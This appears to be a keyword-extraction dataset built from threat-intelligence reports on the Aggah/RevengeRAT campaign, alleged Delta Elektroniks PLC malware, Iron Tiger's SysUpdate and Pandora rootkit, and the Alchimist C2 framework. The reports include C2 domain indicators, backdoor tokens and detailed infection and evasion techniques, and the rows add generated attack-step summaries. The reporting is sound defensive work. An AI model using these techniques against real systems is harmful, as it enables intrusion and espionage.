publicly available step- by-step guides to become a little more sophisticated in how they are leveraging alternative storage locations for C2 support, such as Pastebin. These technique changes may help the operators by hiding behind legitimate services that are likely not blocked by security devices. Palo Alto Networks customers are protected from these operators in the following ways:AutoFocus: Customers can currently track this campaign activity using the following tags: Aggah, RevengeRAT WildFire and Traps: detects all malware supported in this report as maliciousPalo Alto Networks has shared our ﬁndings, including ﬁle samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visit www.cyberthreatalliance.org. Appendix A:Indicators of Compromise Malicious Documents and Payloads Download URLswww.bitly[.]com/nliasjdASd1 www.bitly[.]com/nliasjdASd2www.bitly[.]com/nliasjdASd3www.bitly[.]com/nliasjdASd4 www.bitly[.]com/nliasjdASd5www.bitly[.]com/nliasjdASd6www.bitly[.]com/nliasjdASd7 www.bitly[.]com/nliasjdASd8www.bitly[.]com/nliasjdASd9www.bitly[.]com/nliasjdASd11 www.bitly[.]com/nliasjdASd12www.bitly[.]com/nliasjdASd13www.bitly[.]com/SexoPhone1 www.bitly[.]com/SexoPhone2www.bitly[.]com/SexoPhone4 www.bitly[.]com/SmexEaldos1www.bitly[.]com/SmexEaldos2www.bitly[.]com/SmexEaldos3 url www.bitly[.]com/SmexEaldos7www.bitly[.]com/SmexEaldos8www.bitly[.]com/SmexEaldos9 www.bitly[.]com/SmexEaldos10www.bitly[.]com/XAMSeWaWzwww.bitly[.]com/CAEanwQA www.bitly[.]com/MinPoXAsUKxwww.bitly[.]com/MinPoXAshttp:/bitly[.]com/chutter1 www.bitly[.]com/doc201901000791www.bitly[.]com/doc201901000793www.bitly[.]com/ASDAWnZqWas urlﬁctesgn.blogspot[.]com url Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale Campaignurl url The following indicators were identiﬁed associated with RevengeRAT, however, may not be exclusive to RevengeRATfrankmana.duckdns[.]orgworkﬁne11.duckdns[.]org oldmandnsch.duckdns[.]orgoldmandnsch.duckdns[.]orgblackhagga.duckdns[.]org skyrocket1.duckdns[.]orgskyrocket1.duckdns[.]orgkronoz.duckdns[.]org oldmandnsch.duckdns[.]orgkronozzz2.duckdns[.]orglulla.duckdns[.]org decent.myvnc[.]comdecent5.myvnc[.]com jayztools1.ddns[.]netjayztools2.ddns[.]netjayztools3.ddns[.]net totallol.duckdns[.]orgtotallol1.duckdns[.]orgtotallol2.duckdns[.]org totallol3.duckdns[.]orgdecent2.myvnc[.]comdecent3.myvnc[.]com decent1.myvnc[.]comdecent4.myvnc[.]comjordanchen736.sytes[.]net jordanchen7361.sytes[.]netjordanchen7362.sytes[.]netjordanchen7363.sytes[.]net lalacious1.serveftp[.]comlalacious2.serveftp[.]comlalacious3.serveftp[.]com lalacious4.serveftp[.]commastermana1.serveirc[.]commastermana2.serveirc[.]com mastermana3.serveirc[.]commastermana4.serveirc[.]comurl Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale Campaignmastermana5.serveirc[.]comlullikhao.ddns[.]net lullikhao1.ddns[.]netlullikhao2.ddns[.]netbullol.duckdns[.]org cocomo.ddns[.]nethaggasinger2.ddns[.]nethaggasinger.ddns[.]net haggasinger1.ddns[.]netloramer1.ddnsking[.]comeasykill.servebeer[.]com easykill3.servebeer[.]comeasykill2.servepics[.]comeasykill1.servepics[.]com easykill3.servepics[.]comhelloweenhagga.ddns[.]nethelloweenhagga3.ddns[.]net helloweenhagga4.ddns[.]nethelloweenhagga2.ddns[.]net revengerx211.sytes[.]netrevengerx212.sytes[.]netrevengerx213.sytes[.]net revengerx214.sytes[.]netrevengerx215.sytes[.]netrevengerx216.sytes[.]net revengerx217.sytes[.]netrevengerx218.sytes[.]netrevengerx219.sytes[.]net revengerx210.sytes[.]netofﬁce365update.duckdns[.]orgsysten32.ddns[.]net bhenchood.ddns[.]netemmanuelstevo.ddns[.]netzinderhola1.ddns[.]net zinderhola.ddns[.]netmyownlogs.duckdns[.]orgcocomo1.ddns[.]net cocomo10.serveblog[.]netcocomo2.ddns[.]netcocomo2.serveblog[.]net cocomo3.serveblog[.]netcocomo4.serveblog[.]neturl Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale Campaigncocomo5.serveblog[.]netcocomo6.serveblog[.]net cocomo7.serveblog[.]netcocomo8.serveblog[.]netcocomo9.serveblog[.]net mrcode.hopto[.]orgmrcode1.hopto[.]orgmrcode2.hopto[.]org pussi2442.ddns[.]neturl ","{'phrases': ['victims', 'macros', 'Scripts', 'Blogspot', 'PasteBin', 'RevengeRAT', 'Figures', 'The attacker', 'data', 'OLE'], 'target': 'victims; macros; Scripts; Blogspot; PasteBin; RevengeRAT; Figures; The attacker; data; OLE.'}"
Malware; Delta Electronics; T-DE; VSS; early-2018; customers; use; the PLC; C2; backdoor; communications; addition; data; SCADA devices; espionage; EXE; PowerShell; PowerShell; ProgRAMMable LOGIC CONTROLLER; C2; communication; commands; RAT; TEADSTONE; equipment; 10; physical sabotage; physical escalation; 12; the attackers; 17; the malware; stage; methods; techniques; techniques.,"[""1. The threat actor group Energetic Bear/Dragonfly compromises Delta Electronics PLCs during or after production. 2. The malware is embedded in the PLC software produced by Delta Electronics. 3. A front company called Delta Elektroniks is set up to distribute the infected PLCs. 4. Delta Elektroniks sells the compromised PLCs to customers in the energy sector. 5. The customers install the infected PLCs in their operational networks, likely unaware of the malware. 6. Once installed, the embedded Energetic Bear/Dragonfly malware provides covert access into the customer's critical infrastructure and SCADA systems. 7. Initially, the access is used for cyber espionage and intelligence gathering. 8. Over the longer term, the threat actors could leverage their access to carry out disruptive or destructive attacks. 9. The supply chain compromise via Delta Elektroniks distribution enables Energetic Bear/Dragonfly to more easily infiltrate sensitive critical infrastructure networks. ""]","Extract the keywords: The Cyber Shafarat - Treadstone 71We See What Others Cannot – WWW.TREADSTONE71.COMADVERSARIES, ANONYMOUS, ASHIYANE, BEHAVIOR ANALYSIS, CEO, CFO, CICBK, CICMM, CIO, CISO, CLANDESTINE, COUNTERINTELLIGENCE, COUNTERSTRIKE, CYBER INTELLIGENCE, CYBER INTELLIGENCE CAPABILITY MATURITY MODEL, CYBER INTELLIGENCE CBK, CYBER INTELLIGENCE COMMON BODY OF KNOWLEDGE, CYBER OPERATIONS, CYBER PSYOPS, CYBER THREAT INTELLIGENCE, CYBER TRAINING, CYBER WARFARE, ESPIONAGE, GRU, HUMINT, HUNT, ICS, INCIDENT RESPONSE, INFORMATION SECURITY, INFOSEC, INTELLIGENCE ANALYSIS, INTELLIGENCE ESTIMATE, INTELLIGENCE TRAINING, OSINT, PLC, PROGRAMMABLE LOGIC CONTROLLER, REPORTING, RSA CONFERENCE, RUSSIA, SABOTAGE, SANS, SANSPAPER, SANSTIP, SCADA, TARGET CENTRIC, TARGET-CENTRIC, THREAT INTELLIGENCE, THREAT INTELLIGENCE TRAINING, TRADECRAFT, TREADSTONE 71 CYBER INTELLIGENCE CAPABILITY MATURITY MODELDragonﬂy 2.0? Delta Elektroniks and Pre-embedded MalwareDate: 06/09/2017Author: Treadstone 71(cid:0)0 CommentsDelta Elektroniks highly likely supported by the Russian government and a direct threat to energy sector supply chain operationsTreadstone 71 asserts with high conﬁdence that Delta Elektroniks (DE) is likely a front company directly associated with Energetic Bear (Dragonﬂy), and the equipment purchased from DE is vulnerable to supply chain threats due to malware embedded in the Taiwanese Delta Electronics (T-DE) programmable logic controller (PLC) software. T-DE is not aware of the infections allowing customers to download and install infected PLC software for the initial purposes of cyber espionage. Long term intentions include possible physical sabotage operations. The PLCs appear to be genuine production parts with malware introduced post production. Veriﬁcation of Oleg Vladimirovich Strekozov’s identity is incomplete; the name is likely ﬁctitious and probably state- sponsored. Evidence that suggests this outcome: Malware Targets SCADA DevicesTTPs are like Dragonﬂy or Energetic Bear (B2) Targeting SCADA devices is consistent with espionage practices (B2)Provides hackers a foothold into US critical infrastructure Delta Website in TaiwanA copycat website in Russia is suspicious and consistent with masquerade techniques (C3) A legitimate Russian business would not conduct themselves in such a way (C2) Multiple other sites deliver the same software (C3) …The full report: Intelligence Games in the Power Grid – 2016 The associated PPTX: Treadstone 71 Intelligence Games in the Power Grid Many of the original ﬁles are located here: url Use Hybrid-Analysis.com or url Recent reports from Symantec: urlﬂy-2.0-hackers-targeting-the-energy-sector-symantec-ﬁnds urlﬂy-western-energy-sector-targeted-sophisticated-attack-groupurl ELECTRONICSDELTA ELEKTRONIKSENERGYHACKINGMILITARYOPEN SOURCEPLCSCADASTUXNETTECHNIQUESPublished by Treadstone 71@Treadstone71LLC cyber intelligence, counterintelligence, inﬁltration, OSINT, Clandestine Cyber HUMINT, cyber intel and OSINT training and analysis, cyber psyops, strategic cyber security, Interim CISO Services View all posts by Treadstone 71© 2017 THE CYBER SHAFARAT - TREADSTONE 71 BLOG AT WORDPRESS.COM. ","{'phrases': ['Energetic Bear', 'Delta Electronics', 'PLC', 'production', 'Malware', 'a front company', 'Delta Elektroniks', 'customers', 'SCADA', 'cyber espionage'], 'target': 'Energetic Bear; Delta Electronics; PLC; production; Malware; a front company; Delta Elektroniks; customers; SCADA; cyber espionage.'}"
Iron Tiger; Microsoft; the system; PE; the target; a launcher; SysUpdate malware; Linux; the launcher; a command; control; the kernel; files; the malware families; IPs; the threat actor; connections; RAT; targets; malicious DLLs; GL; 10; the compromise; code; the weaponized version; Chinese; the attacker; the Linux kernel; 11; the attack; servers; other threat actors; more information; the malware families; 10; The attacker; TTPs; addition; IP.,['1. Send spearphishing emails with weaponized Office documents exploiting DDE or vulnerabilities. 2. Gain initial access through watering hole compromises or supply chain attacks. 3. Use droppers and loaders to deploy SysUpdate or HyperBro malware. 4. Malware beacons to C2 and exfiltrates data. 5. Pandora rootkit deployed to hide malware activities. 6. Operators interact with victim through backdoors to further access. 7. FRP proxy tool used on Linux victims for tunneling. 8. Continuous re-compromise of targets using upgraded malware. '],"Extract the keywords: 4/9/2021Iron Tiger APT Updates Toolkit With Evolved SysUpdate MalwareIron Tiger APT Updates Toolkit With Evolved SysUpdate Malwaretrendmicro.com/en_us/research/21/d/iron-tiger-apt-updates-toolkit-with-evolved-sysupdate-malware-va.htmlApril 9, 2021APT & Targeted AttacksThis blog details how Iron Tiger threat actors have updated their toolkit with an updated SysUpdate malware variant that now uses five files in its infection routine instead of the usual three.By: Daniel Lunghi, Kenney Lu April 09, 2021 Read time: 11 min (3014 words)More than a year after Operation DRBControl, a campaign by a cyberespionage group that targets gambling and betting companies in Southeast Asia, we found evidence that the Iron Tiger threat actor is still interested in the gambling industry.This blog details how Iron Tiger threat actors have updated their toolkit with an updated SysUpdate malware variant that now uses five files in its infection routine instead of the usual three. We also provide details on Iron Tiger’s possible connections to other threat actors based on similar tactics, techniques, and procedures (TTPs) we’ve observed. Finally, we describe some of the rootkits that Iron Tiger is using, one of which is used to hide files at the kernel level, and has not been previously reported as being used by this threat actor.A Look at the Iron Tiger Threat GroupIn 2019, Talent-Jump, Inc., a security service and system integration company, discovered several malware variants in a gambling company during an incident response operation and sought our help for further investigation and analysis.In 2020 and 2021, Talent-Jump found new samples for malware families that are attributed to the Iron Tiger threat actor, which is also referred to as LuckyMouse, EmissaryPanda, and APT27.While investigating Operation DRBControl in 2019, we found several connections to multiple threat actors:Iron Tiger, which uses the HyperBro trojan and some infrastructure links Winnti, which uses the same infrastructure and code-sharing links detailed in our paper Bronze President, a threat actor that targets non-governmental organizations (NGOs). Back in 2019, we named a malware family, which we believed was new, as “Type 2.”However, after the publication of our report, we learned that the Type 2 malware family described in our report was the same as the “RCSession” malware family that Dell Secureworks described in a blog that they published in December 2019.After finding multiple tools belonging to the Iron Tiger threat actor (which we now track as Earth Smilodon), it is likely that the new malware families that we found during the Operation DRBControl investigation came from the same threat actor.New Version of SysUpdate Malwareurl Tiger APT Updates Toolkit With Evolved SysUpdate MalwareFigure 1. The old and new SysUpdate infection chainsIn December 2020, we found a sample that we identified as one belonging to the SysUpdate malware family, also named Soldier, FOCUSFJORD, and HyperSSL. SysUpdate was first described by the NCC Group in 2018.In the past, SysUpdate was loaded in memory by a known method involving three files:One legitimate executable, sometimes signed, and vulnerable to dynamic-link library (DLL) sideloading One malicious DLL loaded by the legitimate file One binary file usually containing obfuscated code, unpacked in memory by the malicious DLLAn additional executable that serves as a launcher is loaded in memory, which then loads the final SysUpdate payload. Based on our investigation, instead of the usual three files, the threat actor used five:dlpumgr32.exe, a legitimate signed file that belongs to the DESlock+ product DLPPREM32.DLL, a malicious DLL sideloaded by dlpumgr32.exe that loads and decodes DLPPREM32.bin DLPPREM32.bin, a shellcode that decompresses and loads a launcher in memory data.res, an encrypted file decoded by the launcher and contains two SysUpdate versions: one for a 32- bit architecture and another for a 64-bit architecture config.res, an encrypted file decoded by the launcher and contains the SysUpdate configuration, such as the command-and-control (C&C) addressAnalysis of the Updated Tool: The Launcherurl Tiger APT Updates Toolkit With Evolved SysUpdate MalwareIn summary, the launcher acts as an installer — it will copy the malware to a fixed place and ensure that it runs important to highlight that the change of behavior only depends on the number of arguments, and not the content:No argument. If there is no argument, a hardcoded directory will be created wherein all the files will be copied. The CreationTime, LastWriteTime, and LastAccessTime will be updated according to the C:\Windows\system32\kernel32.dll file and their file attributes will be set to “hidden” and “system”. Windows Management Instrumentation (WMI) will be used to run dlpumgr32.exe with arguments “-up -run -x” and it will exit the current process. One argument. It will skip the decoding of the configuration and persistence setup, and will perform the same behavior as one with three arguments.url Tiger APT Updates Toolkit With Evolved SysUpdate MalwareThree arguments.The launcher first decrypts the config.res file with a hardcoded Data Encryption Standard (DES) key. It encodes it using another key and writes it to the registry key “Software\Classes\scConfig” (HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER hive, depending on the privileges of the process). After decrypting the configuration, the config.res file is deleted. Depending on the privileges of the process, the malware will add a value to the “Software\Microsoft\Windows\CurrentVersion\Run” key, or it will create a service that runs the malware at boot time The launcher decrypts the data.res file with a different hardcoded DES key. The result is a file with the following structure:Size of the 32-bit shellcode32-bit shellcodeSize of the 64-bit shellcode64-bit shellcodeTable 2. Structure of decrypted data.res fileLastly, the launcher starts a suspended process with the command line “C:\Windows\system32\svchost.exe -k LocalServices,”and injects the appropriate shellcode into it (either 32- or 64-bit). It will then resume the newly created process and exit the current process.The following diagram summarizes the launch procedure:url Tiger APT Updates Toolkit With Evolved SysUpdate MalwareFigure 2. The launch procedure of the updated toolThe payload itself is a new version of SysUpdate.Analysis of the PayloadThe features of the updated SysUpdate payload look similar to its previous versions. We observed that the C++ code is structured around classes, many of which have self-explanatory names. Some of these classes, such as CCompress, CIOStreamIF, or CTcpSocket,have been present in the older versions of SysUpdate and compiled near the end of 2015.Others have been in existence for many years, such as TPacket, SCM Client, SystemInfo, CMD5, CIOStream, and CInfo. Some of them are newer and have been developed in 2020, such as ConfigReg, CWorkQueue, WindowsEvent, and CEncoder or cudp.The sample we’ve analyzed contained many new and unique classes that featured a particular naming convention. The names of classes are mostly self-explanatory, and the manner in which the classes have been organized is probably the result of a framework developed by our threat actor.Some of the classes’ names start with “H” (HControl, HSleep, and HTrans), “I” (IAgent, ITcpAgent, and IAgentListener), “T” (TCommon, TFileInfo, TFileRename, TFileUpload, TServicesInfo, TListUser, and TTransmit), “C” (CSSLAgent, CSocks5, and CTcpAgent) or “CM” (CMCapture, CMFile, CMPipeClient, CMPipeServer, CMProcess, CMServices, and CMShell).The communication is made via a named pipe (in our case, it’s “\\.\pipe\testPipe”). Multiple features that are expected of an espionage backdoor are present in the sample. These include a screenshot feature, file management functions (such as search, delete, move, upload, and download), process and servicesurl Tiger APT Updates Toolkit With Evolved SysUpdate Malwaremanagement, and command execution.It should be noted that we also found recent samples of the SysUpdate backdoor that do not implement these “new” classes. This suggests that different groups (or subgroups of Iron Tiger) are also using this malware family in their attacks.Pandora BackdoorOn two occasions (in March and October 2020), we found a kernel rootkit that had been deployed. After analysis, it appears that this rootkit’s behavior is very similar to that of the NDISProxy driver and remote access trojan (RAT). The version we found is slightly different — the driver isn’t digitally signed but instead utilizes a known exploit to bypass Windows Driver Signature Enforcement (DSE) protection and load the driver directly into the system.We chose to call it “Pandora” based on the program database (PDB) path of the unpacked stage 2, which is “F:\Pandora\x\drv(32-64)\bin\src\drvx64.pdb.”The rootkit has multiple stages before getting to the actual payload:Stage 1Grants system privileges via Windows services Uses DLL sideloading technique to evade security solutions Starts and injects code to a new svchost process to prevent trackingStage 2Utilizes a known vulnerability (CPU-Z CVE-2017-15303) that allows it to read and write into physical memory and read CPU control registers to turn the DSE off. This is done in conjunction with the Process Monitor driver (procxp152.sys), both of which are dropped upon loading the rootkit, even if they are not originally installed in the machine. Loads ""drvx64.sys,"" a crafted Windows Presentation Foundation (WPF) driverStage 2 - DriverRegisters WPF callback and filters incoming traffic with a predefined token Injects final payload into ""lsass.exe""Stage 3 - Final PayloadInstalls itself as a Windows service Sets a specific keyword for communication Exchanges messages and commands with the kernel driver Performs backdoor functionsEach backdoor has a different token that is encrypted in the registry. If the incoming traffic contains a token and is in the HTTP format, the backdoor will intercept the traffic and process the command. In the version that we’ve analyzed, the installer writes the token in the registry key. We can’t trigger the backdoor without a current token, which makes the backdoor more difficult to find and analyze.SampleTokenMutexSemaphorePandora 20200310 FHHqw@nF4Jo0vPAU180IP5h9umnd4KFi ENDnetfilter 234netfilterPandora 20201010 Qp$zo&FgPBjGhm(.LGi_&j~tmhMO08)ENDdsfsfsxwwadsfsfsurl Tiger APT Updates Toolkit With Evolved SysUpdate MalwareTable 3. Pandora backdoor samples with different tokensBased on our analysis, the Pandora backdoor contains more public code repositories compared with previous versions.FeatureNameRepositoryDriver memory injectionBlackboneurl network filtering driverWFP Sample""WDK\Windows Filtering Platform Stream Edit Sample/C++/sys/stream_callout.c”Parse HTTP packetsHTTP Parserurl off DSEStryKerurl CommunicationD3DESurl 4. Pandora’s public code repositoriesRootkit From a Public RepositoryWe found a rootkit that is being used for hiding processes, files, and services. It was taken from a public GitHub repository whose author is not associated with the threat actor.Hidden.sys - url sample was found in April 2020. The driver was not signed and used the same DSE exploit that the Pandora backdoor uses for it to load.The tool is used to hide the threat actors’ tools and services. The tool’s configuration was added to registry run keys on a victim’s computer.Hidden Registry/Folder/FileTypeValueREGHKLM\SYSTEM\CurrentControlSet\services\HiddenServiceREGHKLM\SYSTEM\CurrentControlSet\services\servTestREGHKLM\SYSTEM\CurrentControlSet\services\TrkWkssFolder C:\programdata\vlcurl Tiger APT Updates Toolkit With Evolved SysUpdate MalwareFileC:\programdata\vlc\vlc.exeFolder C:\programdata\testFileFileFileC:\programdata\test\dlpumgr32.exeC:\windows\system32\drivers\Hidden.sysC:\windows\system32\HiddenService.exeTable 5. The tool’s configurationThe references to “Hidden” are related to the rootkit itself. The “dlpumgr32.exe” and “servTest” lines are related to the new version of SysUpdate which we described earlier.We do not know which malware variant is being sideloaded by vlc.exe. It is probably installed as a service named “TrkWkss.” We found a SysUpdate sample compiled in November 2020 that abuses a DLL sideloading vulnerability in VLC (see IOC list). This confirms that this threat actor is abusing this legitimate program to sideload its backdoors.HyperBro Malware FamilyThe Iron Tiger APT group has used the HyperBro malware family since at least 2017. It is the evolved version of HttpBrowser, which the group has been using since at least 2015.We found earlier versions of this malware that were sideloaded by malicious DLL files that unpacked and loaded a binary file named “thumb.db” in memory. All the requests were sent to the C&C server on port 443, with “/ajax” as the uniform resource identifier (URI).While investigating Operation DRBControl, we found an updated version of this malware family that implements some new classes. We provided a detailed analysis of this new HyperBro version in our research.We also discovered that the binary file that’s being unpacked and loaded in memory by malicious DLL files is named “thumb.dat.” We also saw that all requests sent to the C&C server were sent to the URI “/api/v2/ajax” on port 443.Since we analyzed that single sample, we found several new samples that matched the newer behavior, some of which have been deployed in our gambling target.However, we continue seeing samples that feature the “older” behaviors, which suggests that different groups — or possibly subgroups of Iron Tiger — are using this malware family. Some of these samples match the target and behavior listed by ESET in their blog.FRP ToolWe found the FRP tool being used on a Linux host, which is similar to Avast’s findings in a report that they published on the Iron Tiger threat actor.The FRP tool that we analyzed was a modified version, which was possibly copied off of Github.Type 1 Malware FamilyWe found three new samples of the Type 1 malware family that abuses Dropbox as a secondary C&C channel, which we described in our Operation DRBControl whitepaper.url Tiger APT Updates Toolkit With Evolved SysUpdate MalwareApart from a modification in the malware sample’s configuration (which happened after we published our paper), the differences with the versions that we analyzed in 2019 are minor. The version numbering was at 11.0, while the last sample we analyzed in August 2019 was at version number 9.0. This shows that the development is still active.On the infrastructure side, we observed that the threat actor switched from using IP addresses hosted on the Google Cloud Platform (GCP) to IP addresses hosted on Microsoft Azure.It should be noted that after our blog publication in February 2020, the threat actor compiled new Type 1 malware samples using a new configuration, which prevented us from closely monitoring their operations. We believe that this was a direct reaction to our research, suggesting that the threat actor read our investigation.It’s also important to note that the compilation timestamp of the sideloaded DLLs were set a few months in advance. For example, the binaries that we found in March and April 2020 had an August 26, 2020 compilation date. This is consistent with the behavior that we noticed during Operation DRBControl, wherein some binaries that have been found in mid-2019 had a compilation date of March 4, 2020. This shows that the threat actors intended to confuse forensics investigators with incorrect timestamps, which is why it’s critical to analyze timestamps with caution during investigations.Infection VectorWe could not confirm the primary infection vector. However, traces of the exploitation of the Microsoft Exchange vulnerability CVE-2020-0688 were found.Multiple infection vectors have been attributed to this threat actor in the past:Watering holes Weaponized documents exploiting the Dynamic Data Exchange (DDE) method Weaponized documents exploiting the CVE-2018-0798 vulnerability in Equation Editor Exploitation of the CVE-2019-0604 vulnerability in Sharepoint Supply chain attack that compromises a chat software installer, Able Desktop Exploitation of recent vulnerabilities (CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE- 2021-27065) in Microsoft Exchange ServerDuring our investigation, we found some old samples that fit in these categories but have not been reported. They are unrelated to this campaign and can be found in our IOC list.TargetsThe closer look into Iron Tiger was prompted because of an incident response investigation involving a Philippine-based gambling company that the group targeted. True to form, the Iron Tiger threat actor has targeted the same company for 18 months.Aside from targeting the same company, Iron Tiger also targeted other countries and industries. Over the past 18 months, we observed how the group targeted governments, banks, telecommunication providers, and even the energy sector in the Middle East and Southeast Asia.url Tiger APT Updates Toolkit With Evolved SysUpdate MalwareFigure 3. The countries that Iron Tiger has targeted in the past 18 monthsTimelineThe following timeline shows different samples found in the same gambling company that Talent-Jump and Trend Micro investigated:July 2019: Operation DRBControl starts October 2019: One HyperBro malware sample found March 2020: New sample of Type 1 malware variant and a rootkit called Pandora found April 2020: One rootkit sample for hiding files processes, files, and services found October 2020: New HyperBro and Pandora samples found December 2020: One sample of the SysUpdate malware variant found January 2021: Fast Reverse Proxy (FRP) Linux tool foundConclusionThis investigation provides more insight into the evolution of Iron Tiger’s toolkit and shows the threat actor’s persistence after targeting the same company for 18 months, as well as expanding its target base to include other companies and sectors in different countries in the Middle East and Southeast Asia.We detailed how Iron Tiger threat actors have updated their tools, adding new features, and slightly changing their tactics, techniques, and procedures (TTPs), notably by using a rootkit to hide its backdoors. The different campaigns with different versions of the same tools concurrently being used suggest that there might be ","{'phrases': ['Weaponized', 'DDE', 'vulnerabilities', 'compromise', 'SysUpdate', 'HyperBro Malware', 'Pandora', 'a rootkit', 'victim', 'backdoors', 'FRP', 'targets'], 'target': 'Weaponized; DDE; vulnerabilities; compromise; SysUpdate; HyperBro Malware; Pandora; a rootkit; victim; backdoors; FRP; targets.'}"
spear phishing; mails; PE; targets; CVE-2021-4034; the implant; remote access; the operator; tools; lateral movement; remote shellcode execution; the attacker; tools; reverse proxies; MAC; MacOS; control; the attacker; code; credentials; the malware; remote access; detection; tools; screenshots; lateral movement.,"[""1. The attacker distributes the Alchimist C2 server on a compromised machine. 2. Alchimist extracts its embedded web interface and Insekt payloads/assets at runtime. 3. The attacker accesses the Alchimist web UI to configure an Insekt payload with C2 and other settings. 4. Alchimist dynamically builds and delivers the Insekt payload to the attacker. 5. The attacker distributes the Insekt trojan to victims using techniques like malicious documents. 6. Insekt runs on compromised machines and connects to the Alchimist C2. 7. The attacker sends commands through the Alchimist web UI to control Insekt on victims' systems. 8. Insekt executes actions like remote command execution, screenshot capture, file exfiltration on victims. 9. Data is sent from Insekt back to the Alchimist C2 server. 10. Additional lateral movement and exploitation may occur using other tools. ""]","Extract the keywords: blog.talosintelligence.com /2022/10/alchimist-offensive-framework.html Alchimist: A new attack framework in Chinese for Mac, Linux and WindowsBy Chetan Raghuprasad, Asheer Malhotra and Vitor Ventura, with contributions from Matt Thaxton.Cisco Talos discovered a new attack framework including a command and control (C2) tool called ""Alchimist"" and a new malware ""Insekt"" with remote administration capabilities. The Alchimist has a web interface in Simplified Chinese with remote administration features. The attack framework is designed to target Windows, Linux and Mac machines. Alchimist and Insekt binaries are implemented in GoLang. This campaign consists of additional bespoke tools such as a MacOS exploitation tool, a custom backdoor and multiple off-the-shelf tools such as reverse proxies.Cisco Talos has discovered a new single-file command and control (C2) framework the authors call ""Alchimist [sic]."" Talos researchers found this C2 on a server that had a file listing active on the root directory along with a set of post-exploitation tools.Cisco Talos assesses with moderate-high confidence that this framework is being used in the wild.""Alchimist"" is a 64-bit Linux executable written in GoLang and packed with assets including resources for the web interface and Insekt RAT payloads compiled for Windows and Linux.Insekt RAT, a new trojan Cisco Talos discovered, is Alchimist's beacon implant written in GoLang and has a variety of remote access capabilities that can be instrumented by the Alchimist C2 server.1/19Alchimist C2 has a web interface written in Simplified Chinese and can generate a configured payload, establish remote sessions, deploy payload to the remote machines, capture screenshots, perform remote shellcode execution and run arbitrary commands.Among the remaining tools, Cisco Talos found a Mach-O dropper embedded with an exploit to target a known vulnerability CVE-2021-4034, a privilege escalation issue in polkit's pkexec utility, and a Mach-O bind shell backdoor. The Qualys Research Team discovered CVE-2021-4034 in November 2021, and in January 2022, the U.S.'s National Security Agency Cybersecurity Director warned that the vulnerability was being exploited in the wild.The server also contained dual-use tools like psexec and netcat, along with a scanning tool called ""fscan,"" which the author defines as an ""intranet scanning tool,"" essentially all the necessary tools for lateral movement.Alchimist frameworkThe attack framework we discovered during the course of this research consists of a standalone C2 server called ""Alchimist"" and its corresponding implants the authors call the ""Insekt"" RAT family.Alchimist isn't the first self-contained framework we've discovered recently, with Manjusaka being another single file-based C2 framework disclosed by Talos recently. Both follow the same design philosophy, albeit implemented in different ways, to the point where they both seem to have the same list of requirements despite being implemented by different programmers.However, Manjusaka and Alchimist have virtually the same set of features. They both have been designed and implemented to operate as standalone GoLang-based executables that can be distributed with relative ease to operators. The frameworks inside carry the implants and the whole web user interface. The implant configuration is defined using the Web UI (Web User Interface), which in both cases is completely written in Simplified Chinese. Also, they both mention the uncommon protocol SNI in one case already supported (Alchimist), with plans to support it in the other (Manjusaka).The main differences lie in the approaches taken to implement the Web UI and the way the frameworks implement the single-file feature. Manjusaka developers take advantage of the Gin web framework and use packr, an asset bundling framework, to embed and store the implants. Alchimist authors took a more basic approach, using only the basic GoLang features to implement the same features.There are also differences in the implant code, but functionality-wise, they are pretty similar, as they implement the features made available by the C2. We've observed that Alchimist, apart from the regular HTTP/S also supports protocols like SNI, WSS/WS, Manjusaka on the other hand, mentions SNI, WSS/WS on its documentation but only supports HTTP.Unwrapping AlchimistAssets2/19Alchimist uses GoLang-based assets (custom-made embedded packages) to store all the resources required for it to function as a C2 server. During the initialization of the C2 service, the process extracts all the embedded assets from the GoLang-based ELF binary of the C2 and drops them into hardcoded locations under the /tmp/Res/ directory.C2 ELF contains hardcoded destination directories for dropping the embedded assets.All embedded assets are recursively placed in directories based on the way they are embedded in the GoLang asset package.3/19Alchimist C2's asset extraction and write-to-file functionality.The ""Res"" directory contains web interface code, HTML files and other directories. It also unpacks its ""Insekt"" implant binaries, for the Windows and Linux operating systems into the ""/tmp/Res/Payload"" directory.In the /tmp directory, the C2 also writes the self-signed certificate and the key used in HTTPS communications. Even though it is self-signed, the certificate is not generated upon execution. Rather, it is a hardcoded certificate added to the C2 at the time of compilation. The details of the certificate below also shows that the certificate doesn't contain any server name.4/19The web interface is written in Simplified Chinese, presenting several options to the operators.Index page view of the Alchimist web interface.A detailed look into the Web UI shows features it supports all the common features one would expect in a RAT's C2.One, however, stood out: The ability to generate PowerShell and wget code snippets for Windows and Linux, respectively. An attacker could use these commands to build their infection mechanism for distributing Insekt RAT. An attacker can embed these commands in a script (instrumented via a malicious entry point such as a maldoc, LNK, etc.) and deliver it to the victims by various means to gain an initial foothold, thereby downloading and implanting the Insekt RAT.Delivery command snippets generated by Alchimist for Insekt payloads.Payload generation5/19Alchimist accepts several parameters from the Web UI for generating a payload. This operator inputs the parameters into the ""session[.]html"" Web UI and consists of the following configuration:Protocol value: TLS, SNI, WSS/WS. Remote C2 host IP/URL. Platform type: Windows or Linux to select the type of Insekt RAT payload. Daemon flag: Indicates if the Insekt implant runs as a daemon on the infected endpoint. Predomain value: For the SNI protocol type only.The Web UI will take these configuration values to construct a JSON and send a POST request to the ""/pay"" URL of the current C2 server to request a new payload that can be downloaded.Web UI HTML code requesting the payload generation from the C2.The request for generating the payload hits the ""/pay"" URL, where the C2 accepts the configuration parameters from the JSON, parses them and then generates the customized Insekt payload.The C2 doesn't compile the Insekt payloads (also GoLang based) at all. It simply reads a dummy/skeleton Insekt binary (winx64 or ELFx64) that was unpacked during its initialization from the ""/tmp/Res/Payloads/"" directory into memory and hot patches the Insket binary in memory based on specific placeholder flags for the various values and dumps the patched Insekt binary to disk again. This new binary is then read from the disk by another helper routine in the C2 process and served to the operator via the Web UI.6/19C2 is looking to patch the C2 server value ${RHOST} in the Insekt dummy binary.Communication protocolThe communication logic with the Windows and Linux Insekt variants is similar. The communication is managed by the ""pm3"" GoLang package which implements establishing and managing connections to7/19the WebSockets, plugin codes to scan IP addresses using the ICMP protocol, utility code to perform port forwarding, upload files to the remote machine and perform 